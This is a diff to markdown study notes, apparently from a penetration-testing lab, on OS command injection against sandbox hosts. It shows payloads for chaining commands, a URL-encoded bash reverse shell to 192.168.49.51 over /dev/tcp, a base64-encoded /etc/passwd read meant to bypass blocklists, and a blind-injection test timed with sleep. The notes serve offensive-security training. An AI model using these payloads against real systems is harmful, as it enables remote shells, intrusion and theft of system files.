@@ -1,3 +1,9 @@
+## Command Injection
+
+---
+
+### Chaining of Commands & System Calls
+
 ```shell
 http://target:80/python/index.py?ip=127.0.0.1|id
 ```
@@ -52,6 +58,8 @@ echo "This is an `whoami` echo statement"
 echo "This is an $(whoami) echo statement"
 ```
 
+### Common Protections
+
 We'll listen (bind) to the 0.0.0.0 interface (-l), request verbose output (-v), print numerical IP addresses and ports in all output (-n), and bind to port 9090 (-p 9090). Let's combine these arguments and run our listener.
 
 ```shell
@@ -69,6 +77,7 @@ URL-encoded
 ```shell
 curl "http://target/nodejs/index.js?ip=127.0.0.1|bash+-c+'bash+-i+>%26+/dev/tcp/192.168.49.51/9090+0>%261'"
 ```
+
 
 A Null Statement Injection Bypass can be inserted between any characters of our choosing.
 
@@ -159,6 +168,32 @@ http://target/php/blocklisted.php?ip=127.0.0.1;`echo%20%22Y2F0IC9ldGMvcGFzc3dkCg
 ```shell
 http://target/php/blocklisted_exercise.php?ip=127.0.0.1/ni$(Y2F0IC9ldGMvcGFzc3dkCg)d
 ```
+
+### Blind OS Command Injection Bypass
+
+Let's try out a blind command injection vulnerability in our sandbox application by attempting to run the id command.
+
+```shell
+http://target:80/php/blind.php?ip=127.0.0.1;id
+```
+
+To set a benchmark, we will use time to measure how long our curl request takes against a server we know is down:
+
+```shell
+time curl http://ci-sandbox:80/php/blind.php?ip=127.0.0.1
+```
+
+According to the output, this took 10.014s. This time may vary between virtual environments.
+
+Next, let's inject a twenty-second sleep command to attempt to pause the request's execution. If the request pauses, we may have a blind injection vector.
+
+```shell
+time curl "http://ci-sandbox:80/php/blind.php?ip=127.0.0.1;sleep%2020"
+```
+
+This time, the request took thirty seconds. Clearly, the sleep command ran. Very nice. We've discovered a blind command injection vector!
+
+
 
 # 🔄 Alternatives to `base64` Binary (Encode/Decode)
 
